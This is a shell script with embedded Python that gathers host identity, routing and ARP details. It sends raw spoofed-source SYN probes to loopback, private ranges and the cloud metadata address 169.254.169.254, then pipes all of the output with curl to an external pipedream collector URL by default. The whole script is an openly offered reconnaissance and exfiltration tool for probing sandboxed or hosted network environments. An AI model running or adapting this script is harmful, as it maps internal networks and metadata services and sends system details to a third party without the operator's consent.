#!/bin/sh
# raw-special-ip-syn-matrix.sh
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh raw-special-ip-syn-matrix.sh

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
POST_TIMEOUT="${POST_TIMEOUT:-20}"

(
set -x

date
id
hostname -I 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /sys/class/net/eth0/address 2>&1 || true

python3 - <<'PY'
import socket, struct, random, time, select

IFACE = "eth0"
SRC_IP = "192.0.2.2"
SRC_MAC = None
GW_MAC = "02:fc:00:00:00:05"

TARGETS = [
    "0.0.0.0",
    "0.0.0.1",
    "0.255.255.255",
    "127.0.0.1",
    "169.254.169.254",
    "10.0.0.1",
    "100.64.0.1",
    "192.0.2.1",
]

PORTS = [80, 443, 8080, 8443]

def mac_bytes(s):
    return bytes(int(x, 16) for x in s.split(":"))

def get_iface_mac(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return mac_bytes(f.read().strip())

def checksum(data):
    if len(data) % 2:
        data += b"\0"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff

def build_syn(src_ip, dst_ip, sport, dport, seq):
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    iphdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, random.randrange(0, 65535), 0, 64,
        socket.IPPROTO_TCP, 0, src, dst
    )
    iphdr = iphdr[:10] + struct.pack("!H", checksum(iphdr)) + iphdr[12:]

    tcp = struct.pack(
        "!HHLLBBHHH",
        sport, dport, seq, 0, 5 << 4, 0x02, 64240, 0, 0
    )
    pseudo = src + dst + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp)) + tcp[18:]

    return iphdr + tcp

def eth_frame(src_mac, dst_mac, payload):
    return dst_mac + src_mac + b"\x08\x00" + payload

def parse_eth_ipv4(frame):
    if len(frame) < 34 or frame[12:14] != b"\x08\x00":
        return None
    pkt = frame[14:]
    ihl = (pkt[0] & 0xf) * 4
    proto = pkt[9]
    src = socket.inet_ntoa(pkt[12:16])
    dst = socket.inet_ntoa(pkt[16:20])
    return pkt, ihl, proto, src, dst

def flags_str(flags):
    out = []
    for bit, name in [(0x01,"FIN"),(0x02,"SYN"),(0x04,"RST"),(0x08,"PSH"),(0x10,"ACK")]:
        if flags & bit:
            out.append(name)
    return ",".join(out) or "-"

src_mac = get_iface_mac(IFACE)
gw_mac = mac_bytes(GW_MAC)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
sock.bind((IFACE, 0))
sock.setblocking(False)

probes = {}

for dst in TARGETS:
    for dport in PORTS:
        sport = random.randrange(30000, 60000)
        seq = random.randrange(0, 2**32 - 1)
        probes[(dst, dport, sport)] = {"seq": seq, "result": "NO_RESPONSE"}
        pkt = build_syn(SRC_IP, dst, sport, dport, seq)
        sock.send(eth_frame(src_mac, gw_mac, pkt))
        print(f"SENT {SRC_IP}:{sport}->{dst}:{dport} seq={seq}")

deadline = time.time() + 4

while time.time() < deadline:
    r, _, _ = select.select([sock], [], [], 0.25)
    if not r:
        continue
    frame = sock.recv(65535)
    parsed = parse_eth_ipv4(frame)
    if not parsed:
        continue
    pkt, ihl, proto, ip_src, ip_dst = parsed
    if proto != socket.IPPROTO_TCP or len(pkt) < ihl + 20:
        continue
    sport, dport, seq, ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", pkt[ihl:ihl+20])
    flags = off_flags & 0x01ff

    # response reverses ports: source port is target port, dest port is our ephemeral
    for (dst, target_port, our_sport), rec in list(probes.items()):
        if ip_src == dst and ip_dst == SRC_IP and sport == target_port and dport == our_sport:
            rec["result"] = flags_str(flags)
            rec["seq"] = seq
            rec["ack"] = ack
            print(f"RECV {ip_src}:{sport}->{ip_dst}:{dport} flags={flags_str(flags)} seq={seq} ack={ack}")

print("=== SUMMARY ===")
for dst in TARGETS:
    for port in PORTS:
        matches = [(k, v) for k, v in probes.items() if k[0] == dst and k[1] == port]
        result = matches[0][1]["result"] if matches else "?"
        print(f"{dst}:{port} {result}")

sock.close()
PY

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
